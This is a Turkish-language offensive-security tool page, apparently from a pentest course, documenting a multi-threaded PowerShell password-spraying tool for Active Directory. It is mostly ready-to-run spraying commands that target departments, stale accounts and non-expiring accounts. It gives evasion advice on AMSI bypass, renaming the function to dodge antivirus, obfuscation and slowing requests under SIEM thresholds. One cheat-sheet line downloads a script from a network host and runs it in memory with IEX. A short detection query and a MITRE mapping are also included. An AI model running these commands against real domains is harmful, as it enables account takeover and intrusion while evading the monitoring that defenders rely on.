# Spray-Passwords

> **Kategori:** [3. DİZİN KEŞFİ, GRAF ANALİZİ VE SALDIRI YOLU HARİTALAMA (RECON & BLOODHOUND)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Mark Kraus (@markekraus) tarafından geliştirilen; PowerShell RunspacePool mimarisi ile çok iş parçacıklı (multi-threaded) paralel parola püskürtmesi (Password Spraying) yapan, LDAP ve Win32 API kimlik doğrulama seçenekleri sunan gelişmiş PowerShell aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında parola püskürtme saldırıları yürütülürken en büyük operasyonel zorluklardan biri **zaman yönetimi ve etki alanı boyutudur**. Geleneksel PowerShell püskürtme betikleri (örneğin klasik tek iş parçacıklı döngüler) kullanıcıları sırayla tek tek test eder. 20.000 ila 100.000 kullanıcının bulunduğu dev kurumsal ortamlarda tek bir parolayı tüm kullanıcılara denemek saatler hatta günler sürebilir.

**Spray-Passwords** (`Invoke-SprayPasswords`), PowerShell'in yerel **RunspacePool** altyapısını kullanarak bu performans darboğazını aşar. Araç, belirlenen iş parçacığı sayısı (thread count) kadar paralel çalışan arka plan çalışanları (workers) oluşturur. LDAP veya yerel Win32 API (`LogonUser`) metotlarını kullanarak hedef etki alanındaki aktif kullanıcıları paralel olarak test eder; böylece saatler sürecek bir parola püskürtme operasyonunu dakikalar seviyesine indirir.

Ayrıca araç, gelişmiş hedef filtreleme yeteneklerine sahiptir. Kilitli veya devre dışı hesapları otomatik olarak ayıklar, `badPwdCount` eşiklerini denetler, belirli bir Kurumsal Birim (OU) altını hedefleyebilir ve elde edilen başarılı oturumları boru hattına (`Pipeline`) standart PowerShell nesnesi (`PSCustomObject`) olarak aktarabilir.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                        SPRAY-PASSWORDS ÇALIŞMA MİMARİSİ                           |
+-----------------------------------------------------------------------------------+
                                          |
                      [Operatör / PowerShell Runspace]
             Invoke-SprayPasswords -Password 'Sonbahar2026!' -Threads 20
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                    1. Adım: Dizin Keşfi ve Filtreleme Motoru                      |
|     (LDAP / DirectorySearcher ile Aktif ve Kilitli Olmayan Hesaplar Çekilir)      |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                   2. Adım: PowerShell RunspacePool Başlatılır                     |
|           [Worker 1]     [Worker 2]     [Worker 3] ... [Worker 20]                |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                    3. Adım: Paralel Kimlik Doğrulama Katmanı                      |
|         - Metot 1: LDAP / LDAPS Bind (DirectoryEntry - TCP 389/636)               |
|         - Metot 2: Win32 LogonUser API (Advapi32.dll - Logon Type 3)              |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                              Hedef Etki Alanı Denetleyicisi                        |
|             (Eşzamanlı Doğrulama İstekleri: Paralel AS-REQ / NTLM)                |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                          Boru Hattı (Pipeline) ve Rapor                           |
|       - Yeşil Konsol Çıktısı                                                      |
|       - PSCustomObject Çıktısı (Where-Object, Export-Csv ile Tam Uyumlu)          |
+-----------------------------------------------------------------------------------+
```

### Neden Önemli?

| Yetenek | Operasyonel Değer | Sızma Testi Avantajı |
|---|---|---|
| **Çok İş Parçacıklı Performans**| PowerShell RunspacePool ile 10-50 paralel thread. | On binlerce kullanıcılık dizinlerde püskürtme süresini 10 kat hızlandırır. |
| **Gelişmiş LDAP Filtreleme** | `-SearchBase`, `-Filter` ve OU bazlı hedefleme desteği. | Tüm şirketi taramadan belirli bir departmana (örneğin Çağrı Merkezi) odaklanma. |
| **Esnek Doğrulama Metotları** | LDAP Bind veya Win32 LogonUser seçenekleri. | Güvenlik duvarı veya port kısıtlamalarına göre en uygun kimlik doğrulama yolunu seçme. |
| **Pipeline Entegrasyonu** | Çıktıları PowerShell boru hattına nesne olarak iletir. | Başarılı hesapları tek satırda `Export-Csv` veya BloodHound'a bağlama olanağı. |

### 1.1 PowerShell RunspacePool vs Standart PowerShell Job (Start-Job)

Spray-Passwords aracının yüksek hızının arkasında yatan .NET Runspace mimarisinin operasyonel karşılaştırması:

| Kriter | PowerShell RunspacePool (Spray-Passwords) | Standart PowerShell Job (`Start-Job`) |
|---|---|---|
| **Süreç Modeli** | Tek bir `powershell.exe` içinde hafif iş parçacıkları (threads). | Her iş için ayrı bir `powershell.exe` süreci başlatılır (Process Overhead). |
| **Bellek Tüketimi** | Çok Düşük (~30-50 MB toplam RAM kullanımı). | Çok Yüksek (Her süreç için ek 40-60 MB RAM). |
| **Başlatma Gecikmesi** | Neredeyse Anında (Milisaniyeler içinde thread aktivasyonu). | Yavaş (Her süreç için .NET CLR ve PS motoru yeniden yüklenir). |
| **EDR Görünürlüğü** | Düşük (Tek süreç altında dahili iş parçacığı yönetimi). | Çok Yüksek (Sysmon Event ID 1 ile onlarca yeni işlem alarmı). |
| **Püskürtme Kapasitesi**| Saniyede 100-300 kullanıcı doğrulaması. | Saniyede 5-10 kullanıcı doğrulaması. |

### Alternatif Araçlarla Karşılaştırma

| Kriter | Spray-Passwords | DomainPasswordSpray | Kerbrute | NetExec (nxc) | Rubeus (spray) |
|---|---|---|---|---|---|
| **Eşzamanlılık (Multi-thread)**| **Var (RunspacePool)** | Yok (Single-thread) | **Var (Goroutines)** | Var (Python Threads) | Yok |
| **Platform** | Windows (PowerShell) | Windows (PowerShell) | Linux / Win (Go) | Linux / Windows | Windows (C#) |
| **Filtreleme Gücü** | **Çok Yüksek (LDAP/OU)**| Orta | Düşük (Wordlist) | Orta | Kısıtlı |
| **Doğrulama Protokolü** | LDAP / Win32 API | Win32 / NetAPI | Kerberos AS-REQ | SMB / Kerberos | Kerberos |
| **Gereksinim** | PowerShell 5.1+ | PowerShell 2.0+ | Bağımsız Binary | Python Ortamı | .NET CLR |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Spray-Passwords modülü PowerShell oturumuna aktarıldıktan sonra `Invoke-SprayPasswords` cmdlet'i ile çalıştırılır:

```powershell
Import-Module .\Spray-Passwords.ps1
Invoke-SprayPasswords [parametreler]
```

### 2.1 Temel Çalışma Parametreleri

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `-Password` | Püskürtülecek tek bir parola dizisi. | `-Password "Kış2026!"` |
| `-PasswordList` | Sırayla püskürtülecek parolaların bulunduğu dizi veya dosya. | `-PasswordList (Get-Content passes.txt)` |
| `-Threads` | Eşzamanlı çalışacak PowerShell Runspace iş parçacığı sayısı. | `-Threads 20` (Varsayılan: 10) |
| `-Domain` | Sorgulanacak hedef etki alanı adı. | `-Domain "corp.local"` |
| `-Server` | Sorguların gönderileceği spesifik Etki Alanı Denetleyicisi IP/FQDN. | `-Server "10.10.10.10"` |
| `-SearchBase` | Yalnızca belirtilen OU altındaki kullanıcıları sorgular. | `-SearchBase "OU=Users,DC=corp,DC=local"` |
| `-Filter` | Kullanıcıları seçmek için özel LDAP arama filtresi. | `-Filter "(&(objectCategory=person)(department=Finans))"` |

### 2.2 Güvenlik ve Eşik Parametreleri

| Parametre | Açıklama | Varsayılan Değer |
|---|---|---|
| `-Delay` | İstekler arasına milisaniye cinsinden gecikme ekler. | `0` (Gecikmesiz) |
| `-LockoutThreshold` | Hesabın kilitlenmesini önlemek için maksimum hatalı giriş limiti. | `5` |
| `-LogonMethod` | Kimlik doğrulama yöntemi (`Ldap`, `LogonUser`). | `Ldap` |
| `-SSL` | LDAP doğrulamasında LDAPS (TCP 636) protokolünü zorlar. | *(Anahtar bayrak)* |
| `-OutputFile` | Başarılı sonuçların kaydedileceği dosya yolu. | `None` (Konsola basar) |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: 20 İş Parçacığı ile Yüksek Hızlı Parola Püskürtme

Etki alanındaki tüm kullanıcılara 20 thread ile hızlıca mevsimlik bir parolayı deneme:

```powershell
# 1. Modülü içe aktarma
. .\Spray-Passwords.ps1

# 2. Çok iş parçacıklı püskürtme başlatma
Invoke-SprayPasswords -Password 'Sonbahar2026!' -Threads 20 -Domain 'corp.local'
```

**Konsol Çıktısı Analizi:**

```text
[+] Connected to LDAP server: dc01.corp.local
[+] Querying domain for active user accounts...
[+] Found 3,850 enabled user accounts.
[+] Initializing RunspacePool with 20 threads...
[*] Starting password spray operation...
[SUCCESS] corp.local\ahmet.kaya - Sonbahar2026!
[SUCCESS] corp.local\ayse.yilmaz - Sonbahar2026!
[SUCCESS] corp.local\stajyer01 - Sonbahar2026!
[*] Spray completed in 42.15 seconds.
[*] Total Accounts Tested: 3,850 | Success: 3 | Failed: 3,847
```
*Analiz: 3.850 kullanıcı yalnızca 42 saniyede taranmış ve 3 adet geçerli kimlik bilgisi elde edilmiştir.*

### Senaryo 2: Yalnızca Belirli Bir Departmanı (OU) Hedefleyerek Püskürtme

Ağda gereksiz alarm üretmemek için yalnızca zayıf parola kullanma ihtimali yüksek olan Çağrı Merkezi OU'sunu hedefleme:

```powershell
Invoke-SprayPasswords \
  -SearchBase "OU=CallCenter,OU=Users,DC=corp,DC=local" \
  -Password 'CallCenter2026!' \
  -Threads 10
```

### Senaryo 3: Parolası Süresi Dolmayan (PasswordNeverExpires) Hesaplara Püskürtme

Parola değişim zorunluluğu olmayan bayat veya servis hesaplarını LDAP filtresiyle ayıklayıp püskürtme:

```powershell
Invoke-SprayPasswords \
  -Filter "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=65536))" \
  -Password 'Welcome2026!' \
  -Threads 15
```

### Senaryo 4: Şifreli LDAPS (Port 636) Üzerinden Kimlik Doğrulama

Ağ dinleyicilerini (sniffers) atlatmak için LDAP kimlik doğrulamasını TLS şifrelemesiyle yürütme:

```powershell
Invoke-SprayPasswords \
  -Server "dc01.corp.local" \
  -SSL \
  -Password 'Password123!' \
  -Threads 10
```

### Senaryo 5: Başarılı Sonuçları Doğrudan CSV Dosyasına Dışa Aktarma

PowerShell boru hattı uyumu sayesinde başarılı hesapları anında CSV tablosuna yazma:

```powershell
Invoke-SprayPasswords -Password 'Sirket2026!' -Threads 20 | Export-Csv -Path 'C:\Temp\cracked_users.csv' -NoTypeInformation
```

### Senaryo 6: Parolası 1 Yıldan Uzun Süredir Değişmeyen Bayat Hesaplara Püskürtme

Parola yenileme politikalarından muaf tutulmuş veya unutulmuş eski hesapları LDAP `pwdLastSet` özniteliğiyle filtreleyerek püskürtme:

```powershell
# 1. 1 yıldan eski parola tarihine sahip hesapları LDAP ile sorgulama
$oneYearAgo = (Get-Date).AddDays(-365).ToFileTime()
$staleFilter = "(&(objectCategory=person)(pwdLastSet<=$oneYearAgo)(!(pwdLastSet=0)))"

# 2. Yalnızca bu bayat hesaplara çok iş parçacıklı püskürtme yapma
Invoke-SprayPasswords -Filter $staleFilter -Password 'Sirket123!' -Threads 10
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Olası Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `The RunspacePool state is Invalid / Out of memory` | Aşırı yüksek thread sayısı (`-Threads 100+`) nedeniyle sistem belleği veya PowerShell runspace havuzu tükendi. | İş parçacığı sayısını makul bir seviyeye indirin (`-Threads 10` veya `-Threads 20`). |
| `This script contains malicious content and has been blocked by your antivirus software` | Windows Defender AMSI betik içeriğini imza tabanlı olarak engelledi. | Bellek içi AMSI bypass uygulayın, fonksiyon adını `Invoke-UserVerification` olarak değiştirin veya `Kerbrute` ikilisine geçin. |
| `System.DirectoryServices.DirectoryServicesCOMException: The server is not operational` | İstemci makine DC'nin port 389/636 portuna erişemiyor veya DNS çözülemiyor. | `-Server <DC_IP>` bayrağı ile doğrudan DC IP adresini belirtin; rota ve güvenlik duvarı kurallarını kontrol edin. |
| `Win32Exception (0x80004005): Access is denied in LogonUser` | `LogonUser` metodu kullanıldığında yerel güvenlik politikası "Ağ üzerinden bu bilgisayara erişim" yetkisini kısıtlamış. | Kimlik doğrulama metodunu varsayılan LDAP moduna çevirin (`-LogonMethod Ldap`). |
| `Account lockout occurs despite LockoutThreshold check` | Çok iş parçacıklı yarış durumu (race condition): Birden çok thread aynı kullanıcı için aynı anda hata üretti veya replikasyon gecikmesi yaşandı. | Thread sayısını düşürün (`-Threads 5`), her kullanıcı için yalnızca tek parola test ettiğinizden emin olun ve `-Delay 100` ekleyin. |
| `Cannot bind argument to parameter 'SearchBase' because it is null` | Belirtilen OU etki alanında mevcut değil ya da yazım hatası yapıldı. | OU yolunu `Get-ADOrganizationalUnit` veya `AdFind` ile doğrulayın; çift tırnak içine alın. |
| `ExecutionPolicy Restricted: File cannot be loaded because running scripts is disabled` | PowerShell oturumunda betik çalıştırma kısıtlaması aktif. | `powershell -ExecutionPolicy Bypass -NoProfile` ile oturum açın veya kodu belleğe doğrudan yükleyin. |
| `DirectoryServicesCOMException: A referral was returned from the server` | Çoklu etki alanı ormanında aranan nesneler komşu veya üst domain'e yönlendirme gerektiriyor. | `-Domain` bayrağı ile ilgili alt etki alanını açıkça belirtin veya Global Catalog (`-Server target.local:3268`) üzerinden arama yapın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

Spray-Passwords yüksek hızlı çok iş parçacıklı bir araç olduğu için, **yapılandırılma biçimine bağlı olarak ağda ani log sıçramaları (spike) yaratabilir.**

### 5.1 Bırakılan İzler ve Log Kaynakları

1. **Windows Security Event ID 4625 (Logon Failure):**
   - Hatalı parola denenen her kullanıcı için DC üzerinde Event ID 4625 üretilir.
   - Çok iş parçacıklı çalışıldığında, saniyeler içinde yüzlerce 4625 günlüğü ardışık olarak düşer. Bu durum SIEM korelasyon kurallarının "Brute Force / Password Spray Burst" alarmlarını tetikler.
2. **Windows Security Event ID 4624 (Logon Success):**
   - Başarılı girişlerde Type 3 (Network) veya Type 8 (NetworkCleartext) oturumu açılır.
3. **PowerShell Script Block Logging (Event ID 4104):**
   - RunspacePool oluşturan PowerShell kodları `Microsoft-Windows-PowerShell/Operational` günlüğüne tam metin yazılır.

### 5.2 Ağ ve EDR İmzaları

- **Anlık Trafik Sıçraması:** DC'nin 389 (LDAP) veya 445 (SMB) portlarına aynı anda 20-50 TCP bağlantısı açılarak kimlik doğrulama paketleri gönderilmesi.
- **Sysmon Event ID 1:** PowerShell komut satırında şifresiz parolanın görünmesi.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Spray-Passwords Karşılığı |
|---|---|---|
| **T1110.003** | Brute Force: Password Spraying | Çok iş parçacıklı parola püskürtme |
| **T1087.002** | Account Discovery: Domain Account | Aktif kullanıcı hesaplarının çekilmesi |
| **T1201** | Password Policy Discovery | Kilitlenme eşiklerinin denetlenmesi |
| **T1078.002** | Valid Accounts: Domain Accounts | Geçerli kimlik bilgilerinin ele geçirilmesi |

### 5.4 OPSEC Önerileri

| Risk | Tespit Sebebi | OPSEC Önlemi |
|---|---|---|
| **SIEM Burst Alarmı** | Saniyede 100 başarısız oturum açma isteği. | Thread sayısını düşürün (`-Threads 5`) ve `-Delay 250` ile istekler arasına milisaniyelik gecikmeler serpiştirin. |
| **AMSI ve 4104 Logları** | PowerShell betik bloklarının Defender tarafından izlenmesi. | Betik bloklarını karıştırın (obfuscate edin) veya unmanaged PowerShell runner ile bellekten çağırın. |
| **Açık Parola İzi** | Komut satırında `-Password` parametresinin görünmesi. | Parolayı `$pass = Read-Host` ile etkileşimli girin veya base64 çözerek belleğe aktarın. |

### 5.5 Savunma Karşılığı (Blue Team & Detection)

Çok iş parçacıklı parola püskürtmeyi tespit eden örnek Splunk / ELK korelasyon sorgusu:

```text
index=wineventlog EventCode=4625 Logon_Type=3 
| bin _time span=1m
| stats count dc(TargetUserName) as UniqueUsers by _time, Source_Network_Address
| where UniqueUsers > 50
```
*Açıklama: 1 dakikalık zaman penceresinde tek bir IP'den 50'den fazla farklı kullanıcı adına başarısız giriş yapılması, Spray-Passwords gibi çok iş parçacıklı araçların açık bir göstergesidir.*

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```powershell
# 1. 10 İş Parçacığı ile Standart Parola Püskürtme
Invoke-SprayPasswords -Password 'Sonbahar2026!' -Threads 10
```
- **Ne Yapar?** Etki alanındaki aktif kullanıcılara 10 thread paralel olarak belirtilen parolayı dener.
- **Ne Zaman Kullanılır?** Standart parola püskürtme operasyonlarında dengeli hız ve güvenlik için.
- **Parametreler:** `-Password` denenecek parola; `-Threads` eşzamanlı iş parçacığı sayısı.

```powershell
# 2. Belirli Bir Departmanı (OU) Hedefleyerek Çalıştırma
Invoke-SprayPasswords -SearchBase "OU=Satis,DC=corp,DC=local" -Password 'Satis2026!'
```
- **Ne Yapar?** Yalnızca belirtilen Organizasyonel Birim altındaki kullanıcıları hedefler.
- **Ne Zaman Kullanılır?** Tüm şirketi uyandırmadan belirli bir departmanı test ederken.
- **Parametreler:** `-SearchBase` hedef OU Distinguished Name.

```powershell
# 3. Şifreli LDAPS (Port 636) Üzerinden Püskürtme
Invoke-SprayPasswords -Server "dc01.corp.local" -SSL -Password 'Secret123!'
```
- **Ne Yapar?** Kimlik doğrulama paketlerini TLS şifreli tünelden geçirerek ağ dinleyicilerinden korur.
- **Ne Zaman Kullanılır?** Ağ üzerinde aktif IDS/NDR izlemesi olan hassas ortamlarda.
- **Parametreler:** `-SSL` güvenli bağlantı bayrağı; `-Server` DC adresi.

```powershell
# 4. İstekler Arasına Gecikme Ekleyerek Sessiz Tarama (-Delay)
Invoke-SprayPasswords -Password 'Test2026!' -Threads 5 -Delay 200
```
- **Ne Yapar?** Her istek arasına 200 ms bekleme koyarak SIEM anomali eşiklerini atlatır.
- **Ne Zaman Kullanılır?** Gelişmiş SOC ekiplerinin izleme yaptığı ortamlarda.
- **Parametreler:** `-Delay` milisaniye cinsinden bekleme süresi.

```powershell
# 5. Parolası Süresi Dolmayan Hesapları Hedefleme
Invoke-SprayPasswords -Filter "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=65536))" -Password 'Pass123'
```
- **Ne Yapar?** Yalnızca `DONT_EXPIRE_PASSWORD` bayrağı olan hesapları test eder.
- **Ne Zaman Kullanılır?** Parolası hiç değiştirilmeyen eski servis hesaplarını avlarken.
- **Parametreler:** `-Filter` LDAP bitmask filtresi.

```powershell
# 6. Başarılı Sonuçları CSV Formatında Kaydetme
Invoke-SprayPasswords -Password 'Kurum2026!' | Export-Csv -Path .\found.csv -NoTypeInformation
```
- **Ne Yapar?** Başarılı kullanıcıları doğrudan CSV tablosu olarak diske yazar.
- **Ne Zaman Kullanılır?** Sızma testi bulgularını raporlamak veya otomasyona bağlamak için.
- **Parametreler:** `Export-Csv` boru hattı aktarımı.

```powershell
# 7. Farklı Bir Etki Alanı ve Denetleyicisini Hedefleme
Invoke-SprayPasswords -Domain "child.corp.local" -Server "10.10.20.10" -Password 'Child2026!'
```
- **Ne Yapar?** Mevcut makinenin bağlı olduğu domain dışındaki hedef bir DC'yi sorgular.
- **Ne Zaman Kullanılır?** Ormanlar arası yatay hareket denemelerinde.
- **Parametreler:** `-Domain` hedef etki alanı; `-Server` hedef DC IP'si.

```powershell
# 8. Win32 LogonUser API Metodunu Kullanarak Püskürtme
Invoke-SprayPasswords -Password 'Pass2026!' -LogonMethod LogonUser
```
- **Ne Yapar?** LDAP yerine doğrudan Windows işletim sisteminin `LogonUser` API'sini çağırır.
- **Ne Zaman Kullanılır?** DC LDAP erişimi kısıtlı veya filtrelenmiş durumdaysa.
- **Parametreler:** `-LogonMethod LogonUser` kimlik doğrulama metodu.

```powershell
# 9. Çoklu Parola Listesi ile Sıralı Püskürtme
Invoke-SprayPasswords -PasswordList (Get-Content .\top5.txt) -Threads 10
```
- **Ne Yapar?** Verilen listedeki parolaları sırayla tüm kullanıcılara dener.
- **Ne Zaman Kullanılır?** Birden fazla yaygın parolayı arka arkaya denemek için.
- **Parametreler:** `-PasswordList` parola dizisi.

```powershell
# 10. Bellek İçi (Diske Yazmadan) Uzaktan İndirip Çalıştırma
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/spray.ps1'); Invoke-SprayPasswords -Password 'Test123!' -Threads 15
```
- **Ne Yapar?** Dosyayı diske kaydetmeden bellekten çalıştırır.
- **Ne Zaman Kullanılır?** C2 oturumlarında veya uç noktada dosya oluşturma izi bırakmak istenmediğinde.
- **Parametreler:** `IEX` bellek içi yürütme motoru.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [markekraus / Spray-Passwords](https://github.com/markekraus/Spray-Passwords)
- **Mark Kraus Blogu:** [Multi-Threaded Password Spraying with PowerShell Runspaces](https://markekraus.com/)
- **PowerShell RunspacePool Mimarisi:** [Microsoft Docs RunspacePool](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.runspacepool)
- **MITRE ATT&CK Framework:** [Technique T1110.003 - Password Spraying](https://attack.mitre.org/techniques/T1110/003/)

---

> **Önceki:** [← DomainPasswordSpray](./DomainPasswordSpray.md) · **Sonraki:** [← Kategori 04: Zehirleme, MitM ve Zorlamalı Kimlik Doğrulama](../Kategori_04_Zehirleme_MitM_ve_Zorlamali_Kimlik/README.md)
